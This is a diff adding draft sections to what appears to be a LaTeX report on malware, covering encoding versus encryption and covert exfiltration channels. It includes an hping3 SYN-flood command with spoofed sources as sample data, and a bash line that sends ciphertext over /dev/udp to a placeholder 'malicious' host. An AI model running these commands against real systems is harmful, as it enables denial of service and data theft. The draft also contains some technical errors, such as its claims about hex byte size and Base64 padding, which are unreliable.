@@ -5,6 +5,8 @@
 %research all topics deeper than present knowledge! just thoughts for now
 %!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!%
 
+%nice boxes https://tex.stackexchange.com/questions/14967/source-code-listing-with-frame-around-code
+
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
 \chapter{The Security Landscape}
@@ -384,6 +386,42 @@ this list is not intended to be comprehensive, but shows the fundamental behavio
 
 \subsection{Steganography}
 
+\section{Encoding vs Encryption}
+Encoding is a process in which we represent data in a different format. A simple way to think of this is that A = 1, B = 2. Data representation works in the same way,
+base 10 number systems (decimal) can also be represented in base 2 (binary), alongside many others. The data isn't technically changing value, only how it is overtly interpreted.
+Encoding is often used for compression of data, base 16 (hexidecimal) is particually useful for this as each place vlaue represents two bytes, saving key space. Base64 is another common one, that is used in
+Youtube video URLs as it provides a large unique video ID range, and also means that unlisted videos cannot be sequentially guessed.
+
+Encoding can also be used for hiding data, relying on the fact that whoever will see the data, will not understand it's meaning and encoding type.
+This means that clear text can be hidden, stopping people who may come across the data in transmission. The major downside of encoding is the lack of variability of security.
+It does not use a key, and is therefore the same each time. Any system that is reversable without a key, is inherintly insecure. As a result, encryption can be used if the data is of importance
+
+Encryption is the prcoess of producing cipher text from a given input dataset, using a specifided algorithm that provides different output for every key. The key is the important part here,
+while the process is reversable, it requires a key that is outside of the parameters of the static algorithm. This does a great deal for security abstractly, but very much depends on the algorithm and key size used.
+
+\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
+Command =  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+
+To Base64
+    Output = HBpbmczIC1jIDEwMDAwIC1kIDEyMCAtUyAtdyA2NCAtcCAyMSA
+             tLWZsb29kIC0tcmFuZC1zb3VyY2Ugd3d3LmhwaW5nM3Rlc3RzaXRlLmNvbQ==
+
+To AES 256
+    Key = bd7239a02424cd86bd7239a02424cd86bd7239a02424cd86bd7239a02424cd86
+    IV = dab1efbf1d596f73c0e5e1b4486b6178
+    Output = d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc048efb
+    bd971
+    92a46baaecbbac55073b72766c25faf90da1c5f386dc1201451b6e5576798a2439988
+    5112ff1684fa4ac31a1161d72ad66f44ebbaebd05e727f362e15f30315
+
+\end{lstlisting}
+
+%explain briefly the dos command
+
+The IV is also of note in the above example, it relies on the Cipher Block Chain (CBC) mode which uses it as a second key. It is a similar concept as a salt for a hash, and means you need both keys to actually decrypt the data.
+This makes the job of the defence much harder. It means that not only do you need to know the encryption, you need the mode, key, and possibly IV too. Base64 is sometimes used by malware, but can be easily spotted, as the ==
+ at the end is a base64 characteristic.
+
 \subsection{Polymorphic Encryption}
 In this sense, the data, the encryption algorithm and the password can all change, while maintaining the goal of the algorithm.
 It is clear however that while hashing of the source will not work, you can fingerprint and monitor the actions it would take, and identify based from that.
@@ -410,6 +448,19 @@ This can be defeated (like everything), by having abrupt delays to throw the sys
 \chapter{Malware Mechanisms - Exflitration}
 Modern malware are often not static, it changes and morphs based on remote command. For this to work, there must be some form of communciation from victim to attacker. As discussed above, their is usually a side channel for this.
 In C2 structures, it is often advantagous for communciations to be covert and unreadable, as to not create a breadcrumb trail back. 
+
+Data can be pushed over the network, usually in the form of UDP or TCP traffic. 
+
+\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
+    echo "d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc048efbbd97192a46baaecbbac
+    55073b72766c25faf90da1c5f386dc1201451b6e5576798a24399885112ff1684fa4ac31a1161d72ad66f
+    44ebbaebd05e727f362e15f30315" > /dev/udp/malicious.example.com/80
+\end{lstlisting}
+%maybe put image in?
+
+In the above string, the previously encrypted string is sent over the network using bash's network device. UDP on port 80 was chosen for our example server
+
+The above string is enrcypted at rest, but another layer at transit would be ideal to obfuscate the traffic's purpose.
 
 \section{Geo Location Altering}
 As discussed, it is important to conceal the location of the real attacker. It is common in a C2 structure for zombie machines in the botnet to conduct the attacks. This in essence is a proxied attack,
@@ -492,6 +543,8 @@ SSH through DNS can be quite loud in respective to detection software. \citep{DN
 %find a better  way to show quotation
 %good mitigation on that paper
 %try out tools
+
+%I have a lot of notes I need to copy over
 
 \subsection{ICMP}
 ICMP is a control message protocol for IP that lets a host ping another host to validate connectivity. This relies on the other side allowing ICMP, and that it responds. that ICMP allows for a similar kind of exfiltration to DNS. Exfiltration methodologies can be split into two categories, timing and storage based. The former uses time as the boolean measure as to a given status by manipualtion responce/request time, for example delaying responce by 3 seconds if clear text passwords exist.
